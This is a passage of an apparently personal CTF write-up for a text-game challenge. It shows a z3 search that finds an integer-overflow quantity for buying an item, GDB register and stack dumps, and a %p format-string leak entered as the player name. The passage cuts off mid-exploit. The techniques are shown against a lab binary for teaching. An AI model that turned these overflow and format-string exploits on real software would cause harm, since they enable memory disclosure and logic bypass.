+    &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;How many would you like to buy? Must be greater than 0&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;good&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;prices&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;at&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;option&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;auto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cout&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;You don't have the money for that!&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;std&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;endl&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;p&quot;&gt;[...]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;There are four variables that we care about in this code. All four of these variables are stored as &lt;code class=&quot;highlighter-rouge&quot;&gt;unsigned long long&lt;/code&gt;, which is 64 bits on my system.&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;player_funds&lt;/code&gt; - Contains our money&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost&lt;/code&gt; - The price of the thing we want to buy&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; - The quantity that we typed in&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; - Equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost * count&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;What if we could input the value &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; such that &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; is something that is less than the actual price of &lt;code class=&quot;highlighter-rouge&quot;&gt;item&lt;/code&gt;? This could allow us to buy items that we do not have enough money for. In other words, we want &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; to be a value such that &lt;code class=&quot;highlighter-rouge&quot;&gt;count * item_cost &amp;lt; player_funds&lt;/code&gt;. However, we cannot simply input 0 as count because the program checks for zeros.&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+encouragement
+How many would you like to buy? Must be greater than 0
+0
+How many would you like to buy? Must be greater than 0
+0
+How many would you like to buy? Must be greater than 0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We know that we can type in signed integers and have them be interpreted as unsigned integers, so what if we tried a value for &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; that was negative? In order to find such a value for &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt;, I decided to use &lt;code class=&quot;highlighter-rouge&quot;&gt;z3&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;Python&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;3.8.5&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Jul&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2020&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;59&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GCC&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;9.3.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;on&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;copyright&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;credits&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;license&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;more&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;z3&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'total'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'player_funds'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'item_cost'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BitVec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'count'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ULE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;total&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;player_funds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;150&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;item_cost&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Let me explain how this code works. First of all, we create the four variables that we care about: &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;player_funds&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt;. We initialize each of these variables by using a bit vector with 64 bits (since &lt;code class=&quot;highlighter-rouge&quot;&gt;unsigned long long&lt;/code&gt; variables are 64 bits on my machine). We then solve the problem using the following constraints:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; is equal to &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost * count&lt;/code&gt; because that is how &lt;code class=&quot;highlighter-rouge&quot;&gt;total&lt;/code&gt; is calculated in the code.&lt;/li&gt;
+  &lt;li&gt;Make sure that the &lt;code class=&quot;highlighter-rouge&quot;&gt;item_cost&lt;/code&gt; is the price of &lt;code class=&quot;highlighter-rouge&quot;&gt;shout-out-from-literally-god&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;count&lt;/code&gt; is negative so that we can actually do the integer overflow.&lt;/li&gt;
+  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;total &amp;lt;= player_funds&lt;/code&gt;. Note that I used &lt;code class=&quot;highlighter-rouge&quot;&gt;ULE()&lt;/code&gt; here because it makes unsigned comparisons.&lt;/li&gt;
+  &lt;li&gt;Make sure that &lt;code class=&quot;highlighter-rouge&quot;&gt;player_funds&lt;/code&gt; is equal to 150, which is the amount that we always start with.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;The program returned a solution of &lt;code class=&quot;highlighter-rouge&quot;&gt;count = 9223372036854775808&lt;/code&gt;. To see why this solution works, take a look at the following:&lt;/p&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;9223372036854775808000000000000000&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'0b11100011010111111010100100110001101000000000000000000000000000000000000000000000000000000000000000000000000000000'&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:])&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;113&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1000000000000000&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;9223372036854775808&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt;
+&lt;span class=&quot;s&quot;&gt;'0000000000000000000000000000000000000000000000000000000000000000'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Technically, doing &lt;code class=&quot;highlighter-rouge&quot;&gt;total = 1000000000000000 * 9223372036854775808&lt;/code&gt; returns a value that is much greater than the price. However, when we look at the binary representation of this value, we can see that the value needs 113 bits of storage, and the first 64 bits are all zeros. When we use this value as the quantity, we end up only storing 64 bits of zeros in the program. Using this value lets us buy a shout out from god.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+shout-out-from-literally-god
+How many would you like to buy? Must be greater than 0
+9223372036854775808
+Hmmmm
+Nihaal
+You have done well!
+Good job!
+Sincerely,
+	~God
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now we just need to exploit the format string vulnerability that we saw earlier. Using GDB, I set a breakpoint at the location where the format string vulnerability occurred, and I printed out the address of the value that I wanted to change.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Breakpoint 1, purchase () at text-game.cpp:164
+164         printf(name.c_str());
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x6
+$rbx   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 (&quot;tool&quot;?)
+$rcx   : 0x00007ffff7cc51e7  →  0x5177fffff0003d48 (&quot;H=&quot;?)
+$rdx   : 0x0
+$rsp   : 0x00007fffffffda70  →  0xff00ffffffffffff
+$rbp   : 0x00007fffffffdd70  →  0x00007fffffffddd0  →  0x0000000000000000
+$rsi   : 0x0000555555570eb0  →  &quot;Hmmmm\nny would you like to buy? Must be greater t[...]&quot;
+$rdi   : 0x00007ffff7da24c0  →  0x0000000000000000
+$rip   : 0x0000555555557569  →  &amp;lt;purchase()+1545&amp;gt; lea rdi, [rip+0x6d30]        # 0x55555555e2a0 &amp;lt;_Z4nameB5cxx11&amp;gt;
+$r8    : 0x6
+$r9    : 0x00007ffff7d9f240  →  0x0000000000000008
+$r10   : 0x00007ffff7e1d499  →  &quot;_ZNKSt7num_getIcSt19istreambuf_iteratorIcSt11char_[...]&quot;
+$r11   : 0x246
+$r12   : 0x00007fffffffdb40  →  0x00007fffffffdb50  →  0x000000006c6f6f74 (&quot;tool&quot;?)
+$r13   : 0x3
+$r14   : 0x0
+$r15   : 0x0
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffda70│+0x0000: 0xff00ffffffffffff   ← $rsp
+0x00007fffffffda78│+0x0008: 0x8000000000000000
+0x00007fffffffda80│+0x0010: 0xffffffffffffffff
+0x00007fffffffda88│+0x0018: 0x00007fffffffdad0  →  0x0000000000000000
+0x00007fffffffda90│+0x0020: 0x00038d7ea4c68000
+0x00007fffffffda98│+0x0028: 0x0000000000000000
+0x00007fffffffdaa0│+0x0030: 0x00007fffffffda76  →  0x000000000000ff00
+0x00007fffffffdaa8│+0x0038: 0x0000555555571750  →  0x0000555555571760  →  0x000000006c6f6f74 (&quot;tool&quot;?)
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x555555557556 &amp;lt;purchase()+1526&amp;gt; mov    QWORD PTR [rbp-0x2d0], rax
+   0x55555555755d &amp;lt;purchase()+1533&amp;gt; lea    rdi, [rip+0x2f6a]        # 0x55555555a4ce
+   0x555555557564 &amp;lt;purchase()+1540&amp;gt; call   0x555555556620 &amp;lt;puts@plt&amp;gt;
+ → 0x555555557569 &amp;lt;purchase()+1545&amp;gt; lea    rdi, [rip+0x6d30]        # 0x55555555e2a0 &amp;lt;_Z4nameB5cxx11&amp;gt;
+   0x555555557570 &amp;lt;purchase()+1552&amp;gt; call   0x555555556410 &amp;lt;_ZNKSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEE5c_strEv@plt&amp;gt;
+   0x555555557575 &amp;lt;purchase()+1557&amp;gt; mov    rdi, rax
+   0x555555557578 &amp;lt;purchase()+1560&amp;gt; mov    eax, 0x0
+   0x55555555757d &amp;lt;purchase()+1565&amp;gt; call   0x555555556390 &amp;lt;printf@plt&amp;gt;
+   0x555555557582 &amp;lt;purchase()+1570&amp;gt; lea    rdi, [rip+0x2f4b]        # 0x55555555a4d4
+────────────────────────────────────────────────────────────────────────────────────────────────────────────── source:text-game.cpp+164 ────
+    159         tool_time = 50000;
+    160     } else if(option == &quot;shout-out-from-literally-god&quot;){
+    161         bool god_is_happy = rand() &amp;amp; 0xFFFFFF == 0;
+    162         bool* god_is_really_happy = &amp;amp;god_is_happy;
+    163         printf(&quot;Hmmmm\n&quot;);
+ →  164         printf(name.c_str());
+    165         printf(&quot;\nYou have done well!\n&quot;);
+    166         printf(&quot;Good job!\n&quot;);
+    167
+    168         if(*god_is_really_happy){
+    169             printf(&quot;I'm feeling generous right now!\nHave a flag!\n&quot;);
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: &quot;text-game&quot;, stopped, reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+[#0] 0x555555557569 → purchase()
+[#1] 0x555555557a0d → main(argc=0x1, argv=0x7fffffffdec8)
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+gef➤  print god_is_really_happy
+$1 = (bool *) 0x7fffffffda76
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The address was &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffda76&lt;/code&gt;, and since I had ASLR disabled on my machine, I just needed to search for the location of this address when I used a string formatter in my name. In the below example, you can see that the address &lt;code class=&quot;highlighter-rouge&quot;&gt;0x7fffffffda76&lt;/code&gt; is the twelfth pointer being popped off of the stack.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Starting program: /home/n/Documents/Exploitation/metactf/Mining Hero/text-game
+Welcome to this very in-depth game. The goal is to amass wealth and earn the god's favor.
+Before we continue, what is your name?
+%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.
+Current funds: $150
+Your options are:
+1: Place a bet on a coin flip for a chance to double your money
+2: Go mining to earn some money
+3: Buy things
+4: Quit (Your money will not be saved)
+Please enter a number 1-4 to continue...
+3
+What would you like to buy? Options are encouragement (cost: 20), shout-out-from-literally-god (cost: 1000000000000000), tool (cost: 100), or cancel
+shout-out-from-literally-god
+How many would you like to buy? Must be greater than 0
+9223372036854775808
+Hmmmm
